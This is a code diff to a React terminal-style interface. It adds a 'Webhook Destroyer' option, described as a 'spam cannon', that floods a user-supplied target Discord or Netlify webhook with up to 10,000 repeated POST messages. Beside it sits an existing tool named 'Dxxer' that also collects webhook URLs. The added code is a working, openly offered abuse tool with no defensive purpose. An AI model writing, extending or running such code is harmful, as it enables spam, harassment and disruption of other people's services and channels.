@@ -512,8 +512,9 @@ export function FullscreenTerminal() {
       setTool("dxxer");
       append({ text: "" });
       await typewrite("» Launching Dxxer...", "oklch(0.78 0.16 200)", 14);
-      await spinTask("Initialized secure transfer protocol", 500);
-      append({ text: "Supported endpoints: Discord webhooks, Netlify build hooks.", color: "oklch(0.65 0.04 260)" });
+      await typewrite("[*] Initializing secure transfer protocol...", "oklch(0.78 0.16 200)", 10);
+      await sleep(300);
+      await typewrite("    └─ done", "oklch(0.85 0.18 140)", 8);
       append({ text: "" });
       append({ text: "Please enter your webhook URL (Discord or Netlify):" });
       setStage("askWebhook");
@@ -525,9 +526,105 @@ export function FullscreenTerminal() {
       append({ text: "" });
       append({ text: "Username length (3–20):" });
       setStage("askRareLen");
+    } else if (v === "3" || v.toLowerCase().startsWith("destroy") || v.toLowerCase().startsWith("webhook destroy")) {
+      setTool("destroyer");
+      append({ text: "" });
+      await typewrite("» Launching Webhook Destroyer...", "oklch(0.78 0.16 200)", 14);
+      await typewrite("[*] Arming spam cannon...", "oklch(0.78 0.16 200)", 10);
+      await sleep(300);
+      await typewrite("    └─ done", "oklch(0.85 0.18 140)", 8);
+      append({ text: "" });
+      append({ text: "Enter target webhook URL:" });
+      setStage("destroyAskUrl");
     } else {
-      append({ text: "Unknown selection. Type 1 or 2.", color: "var(--terminal-red)" });
+      append({ text: "Unknown selection. Type 1, 2, or 3.", color: "var(--terminal-red)" });
     }
+  };
+
+  // ---- Webhook Destroyer ----
+  const submitDestroyUrl = async (val: string) => {
+    const url = val.trim();
+    append({ text: `> ${url.replace(/(\/[^/]+)$/, "/****")}` });
+    if (!/^https?:\/\/.+/.test(url)) {
+      append({ text: "Invalid URL. Must start with http(s)://", color: "var(--terminal-red)" });
+      append({ text: "Enter target webhook URL:" });
+      return;
+    }
+    setDestroyUrl(url);
+    append({ text: "Enter message to send:" });
+    setStage("destroyAskMsg");
+  };
+
+  const submitDestroyMsg = async (val: string) => {
+    append({ text: `> ${val}` });
+    if (!val.trim()) {
+      append({ text: "Message cannot be empty.", color: "var(--terminal-red)" });
+      append({ text: "Enter message to send:" });
+      return;
+    }
+    setDestroyMsg(val);
+    append({ text: "How many times should it be sent? (1–10000)" });
+    setStage("destroyAskCount");
+  };
+
+  const submitDestroyCount = async (val: string) => {
+    append({ text: `> ${val}` });
+    const n = parseInt(val.trim(), 10);
+    if (!Number.isFinite(n) || n < 1 || n > 10000) {
+      append({ text: "Invalid count. Enter a number between 1 and 10000.", color: "var(--terminal-red)" });
+      append({ text: "How many times should it be sent? (1–10000)" });
+      return;
+    }
+    setDestroyCount(n);
+    append({ text: "Delay between sends in seconds (0.5–5):" });
+    setStage("destroyAskDelay");
+  };
+
+  const submitDestroyDelay = async (val: string) => {
+    append({ text: `> ${val}` });
+    const d = parseFloat(val.trim());
+    if (!Number.isFinite(d) || d < 0.5 || d > 5) {
+      append({ text: "Invalid delay. Enter a number between 0.5 and 5.", color: "var(--terminal-red)" });
+      append({ text: "Delay between sends in seconds (0.5–5):" });
+      return;
+    }
+    setStage("destroying");
+    append({ text: "" });
+    await typewrite(`[*] Locking onto webhook...`, "oklch(0.78 0.16 200)", 10);
+    await sleep(280);
+    await typewrite("    └─ done", "oklch(0.85 0.18 140)", 8);
+    await typewrite(`[*] Preparing payload x${destroyCount}...`, "oklch(0.78 0.16 200)", 10);
+    await sleep(280);
+    await typewrite("    └─ done", "oklch(0.85 0.18 140)", 8);
+    append({ text: "" });
+    append({ text: `[*] Firing ${destroyCount} message(s) @ ${d}s delay`, color: "oklch(0.78 0.16 200)" });
+    let success = 0;
+    let fail = 0;
+    for (let i = 1; i <= destroyCount; i++) {
+      try {
+        const res = await fetch(destroyUrl, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ content: destroyMsg }),
+        });
+        if (res.ok || res.status === 204) {
+          success++;
+          append({ text: `  [${i}/${destroyCount}] ✓ delivered`, color: "oklch(0.85 0.18 140)" });
+        } else {
+          fail++;
+          append({ text: `  [${i}/${destroyCount}] ✗ HTTP ${res.status}`, color: "var(--terminal-red)" });
+        }
+      } catch (e) {
+        fail++;
+        append({ text: `  [${i}/${destroyCount}] ✗ ${(e as Error).message}`, color: "var(--terminal-red)" });
+      }
+      if (i < destroyCount) await sleep(d * 1000);
+    }
+    append({ text: "" });
+    await typewrite(`[✓] DONE — ${success} delivered, ${fail} failed`, "oklch(0.85 0.18 140)", 12);
+    append({ text: "" });
+    append({ text: "Enter target webhook URL (or type 'menu'):" });
+    setStage("destroyAskUrl");
   };
 
   const onSubmit = (e: React.FormEvent) => {
